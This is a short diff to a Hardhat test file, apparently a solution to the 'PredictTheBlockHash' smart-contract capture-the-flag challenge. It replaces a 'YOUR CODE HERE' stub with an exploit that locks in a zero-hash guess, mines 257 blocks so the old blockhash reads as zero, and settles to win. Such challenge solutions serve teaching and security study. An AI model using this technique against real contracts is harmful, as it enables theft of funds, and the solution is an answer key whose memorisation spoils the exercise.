@@ -24,10 +24,12 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    await target.connect(attacker).lockInGuess(ethers.constants.HashZero, {value: ethers.utils.parseEther("1")});
 
+    for (let i = 0; i < 257; i++) {
+      await ethers.provider.send("evm_mine", []);
+    }
+    await target.connect(attacker).settle();
     expect(await target.isComplete()).to.equal(true);
   });
 });
